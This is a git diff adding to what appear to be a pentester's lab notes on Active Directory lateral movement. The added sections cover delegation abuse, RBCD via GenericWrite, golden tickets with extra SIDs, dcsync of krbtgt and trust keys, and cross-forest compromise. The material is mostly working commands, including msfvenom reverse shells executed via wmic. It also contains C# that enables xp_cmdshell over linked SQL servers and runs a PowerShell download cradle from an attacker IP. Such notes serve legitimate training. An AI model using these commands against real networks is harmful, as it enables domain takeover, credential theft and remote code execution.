@@ -519,13 +519,13 @@ runas /user:corp\jen powershell.exe
 
   *
 
-      <figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -637,6 +637,67 @@ runas /user:corp\jen powershell.exe
 
 <details>
 
+<summary>Exploiting GenericWrite on Computer Object</summary>
+
+![](<../.gitbook/assets/image (5).png>)
+
+* Enumerating permissions assigned to current user
+  *   ```powershell
+      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+      ```
+
+
+  * Since we have GenericWrite on appsrv01, we can update any non-protected property on that object, including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.
+
+- <pre class="language-powershell"><code class="lang-powershell"># Create a fake computer account
+  . .\powermad.ps1
+  New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
+  Get-DomainComputer -Identity myComputer
+
+  # Get the SID of myComputer$
+  $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+
+  # Create a Security Descriptor for RBCD
+  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+
+  # Convert and Apply the Security Descriptor to appsrv01
+  $SDbytes = New-Object byte[] ($SD.BinaryLength)
+  $SD.GetBinaryForm($SDbytes,0)
+  Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+  # Verify That RBCD Was Configured
+  $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+  $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+  $Descriptor.DiscretionaryAcl
+
+  # Verify the SID Mapping
+  ConvertFrom-SID S-1-5-21-634106289-3621871093-708134407-3601
+
+  # Generate an NTLM Hash for myComputer$
+  .\Rubeus.exe hash /password:h4x
+
+  # Request a Ticket Granting Service (TGS) Ticket Using Rubeus
+  .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
+
+  # Verify Remote Access to appsrv01
+  dir \\appsrv01.prod.corp1.com\c$
+
+  # Obtaining code execution
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=80 EXITFUNC=thread -f exe -o shell.exe
+  copy shell.exe \\appsrv01.prod.corp1.com\C$\Windows\Temp\shell.exe
+  wmic /node:appsrv01.prod.corp1.com process call create "C:\Windows\Temp\shell.exe"
+
+  <strong>#OR 
+  </strong>
+  python3 mkpsrevshell.py 192.168.45.222 443
+  wmic /node:appsrv01.prod.corp1.com process call create "powershell -e JABjAG.."
+
+  </code></pre>
+
+</details>
+
+<details>
+
 <summary>Unconstrained Delegation</summary>
 
 ![](<../.gitbook/assets/image (313).png>)
@@ -705,5 +766,247 @@ nslookup appsrv01
       * Can laterally move via:
         * [Golden Ticket](persistence.md#golden-ticket)
         * [Dump administrator hash](lateral-movement.md#dump-domain-admin-hash-from-dc)
+
+</details>
+
+<details>
+
+<summary>Contrained Delegation</summary>
+
+* Solve the double-hop issue while limiting access to only the desired backend service defined in msds-allowedtodelegateto
+* S4U2Self --> Allows a service to request Kerberos TGS for any user, including domain admin, without needing their passwords or hash
+* S4U2Proxy --> Allows a service to take a TGS from S4U2Self and exchange it for a TGS to a backend service
+
+![](../.gitbook/assets/image.png)
+
+## Enumeration
+
+*   <pre class="language-powershell"><code class="lang-powershell"><strong>#Powerview
+    </strong><strong>Get-DomainUser -TrustedToAuth
+    </strong></code></pre>
+
+    <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+* Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
+
+## Exploitation
+
+* Compromise the IISSvc account
+  * ```powershell
+    # Generate the NTLM hash
+    .\Rubeus.exe hash /password:lab
+    # Generate TGT for IISSvc
+    .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
+    ```
+* Use S4U2Proxy to get a ticket to MSSQL (SPN listed in msds-allowedtodelegateto field)
+  * ```powershell
+    .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+    ```
+*   Execute code on MSSQL
+
+    * Enumerate the user logged in to MSSQL --> logged in as the domain admin
+
+    <figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Alternative Exploitation
+
+* Modify service names in memory to gain unauthorized access to different services on same host
+* When TGS is returned by KDC, only server name is encrypted but not service name
+* Attacker can modify service name to authenticate to different service
+* For instance if msDS-AllowedToDelegateTo is set to MSSQLSvc/cdc01.prod.corp1.com
+* Able to change it to access file system (cifs)
+* ```powershell
+  .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com /altservice:CIFS /ptt
+  ```
+
+</details>
+
+<details>
+
+<summary>Resource-Based Contrained Delegation</summary>
+
+* msDS-AllowedToActOnBehalfOfOtherIdentity
+* Backend service controls which frontend services can delegate on behalf of users
+* Attack against RBCD needs to happen from a computer account or a service account with a SPN
+
+[Exploiting GenericWrite on Computer Object](lateral-movement.md#exploiting-genericwrite-on-computer-object)
+
+</details>
+
+<details>
+
+<summary>Extra SID Attack</summary>
+
+## Using KRBTGT
+
+* Extracts krbtgt hash for creating a Golden Ticket
+  *   ```powershell
+      lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+      ```
+
+
+* Enumerate Domain & Trust Information (using powerview)
+  *   ```powershell
+      Get-DomainSID -Domain prod.corp1.com
+      Get-DomainSid -Domain corp1.com
+      ```
+
+
+* Forge a Golden Ticket with Extra SIDs
+  *   ```powershell
+      # kerberos::golden /user:<FakeUser> /domain:<OriginDomain> /sid:<OriginDomainSID> /krbtgt:<krbtgtHash> /sids:<RootDomainSID>-519 /ptt
+      kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
+      ```
+
+
+* Access Root Domain Controller
+  *   ```powershell
+      c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
+      whoami /groups
+      ```
+
+
+
+## Using Trust Key
+
+* Extract trust key
+  * Name of the account is always the same as the trusted domain
+  *   ```powershell
+      lsadump::dcsync /domain:prod.corp1.com /user:corp1$
+      ```
+
+
+* Get Domain SID
+  *   ```powershell
+      Get-DomainSID -Domain prod.corp1.com
+      Get-DomainSID -Domain corp1.com
+      ```
+
+
+* Craft golden ticket
+  *   ```powershell
+      kerberos::golden /user:<user_name> /domain:<domain_name> /sid:<domain_sid> /sids:<sid_of_target_domain> /rc4:<trust_key_RC4_key> /service:krbtgt /target:<the_target_domain>
+      kerberos::golden /user:Administrator /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /rc4:d6eba9e9b9bb466be9d9d20c5584c9ef /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /target:corp1.com /ticket:ticket.kirbi
+      ```
+
+
+* Inject ticket with Rubeus
+  *   ```powershell
+      Rubeus.exe asktgs /ticket:ticket.kirbi /dc:rdc01.corp1.com /service:cifs/rdc01.corp1.com /ptt
+      ```
+
+
+* Reinject to PsExec
+  *   ```powershell
+      Rubeus.exe asktgs /ticket:ticket.kirbi /dc:rdc01.corp1.com /service:HOST/rdc01.corp1.com /ptt
+      ```
+
+
+* Access Root Domain Controller
+  * ```powershell
+    c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
+    whoami /groups
+    ```
+
+</details>
+
+<details>
+
+<summary>Abusing PrintSpool service to obtain EA Hash</summary>
+
+* Login to server with unconstrained kerberos delegation (eg: appsrv01)
+  * Can configure a server to have unconstrained kerberos delegation if domain admin
+*   ```powershell
+    ls \\rdc01\pipe\spoolss
+    Rubeus.exe monitor /interval:5 /filteruser:RDC01$
+    .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
+    Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
+    lsadump::dcsync /domain:corp1.com /user:corp1\administrator
+
+    #Login via evil-winrm
+    evil-winrm -i 192.168.177.60 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e
+    ```
+
+
+
+</details>
+
+<details>
+
+<summary>Compromising An Additional Forest</summary>
+
+* Forest trust has SID Filtering
+  * Contents in the ExtraSids field are filtered, grp memberships are not blindly trusted
+  *   ```powershell
+      # Enable sidhistory (Requires DA of target corp2.com)
+      netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
+      # Check that TrustAttributes has TREAT_AS_EXTERNAL
+      Get-DomainTrust -Domain corp2.com
+      ```
+
+
+* Need to find user with RID >= 1000 && user in domain local security groups so as not to be filtered
+  * ```powershell
+    # Enumerate members of the corp2.com built-in administrators group
+    Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
+    # Enumerate Domain (using powerview)
+    Get-DomainSID -Domain corp1.com
+    # Extracts krbtgt hash for creating a Golden Ticket 
+    lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
+    kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:6b1bca4a1f7dbd67e28d3491290e4cb3 /sids:S-1-5-21-3759240818-3619593844-2110795065-1106 /ptt
+    # Laterally move to dc01
+    c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
+    ```
+
+</details>
+
+<details>
+
+<summary>Linked SQL Servers in Forest</summary>
+
+## Enumeration
+
+```powershell
+# Enumeration for any registered SPNs for MSSQL in prod.corp1.com
+setspn -T prod -Q MSSQLSvc/*
+# Enumeration of registered SPNs across domain trust
+setspn -T corp1 -Q MSSQLSvc/*
+setspn -T corp2.com -Q MSSQLSvc/*
+```
+
+## Exploiting
+
+*   Login to the rdc01.corp1.com mssql server
+
+    <figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+
+*   Enumeration for [linked sql servers](../services/1433-mssql.md#linked-sql-servers)
+
+    <figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+
+* Obtaining Reverse shell from dc01.corp2.com
+  * ```csharp
+    String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"dc01.corp2.com\";";
+    SqlCommand command = new SqlCommand(enable_xpcmd, con);
+    command.ExecuteNonQuery();
+    Console.WriteLine("[+] Enabled xp_cmdshell on DC01");
+
+    String powershellCommand = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.222/runall.ps1')";
+    String b64Command = Convert.ToBase64String(Encoding.Unicode.GetBytes(powershellCommand));
+
+    String execCmd = $"EXEC ('EXEC xp_cmdshell ''powershell -EncodedCommand {b64Command}''') AT \"dc01.corp2.com\";";
+    Console.WriteLine("[+] Executing payload on DC01: " + execCmd);
+
+    command = new SqlCommand(execCmd, con);
+    command.ExecuteNonQuery();
+
+    Console.WriteLine("[+] Command executed successfully on DC01.");
+
+    ```
 
 </details>
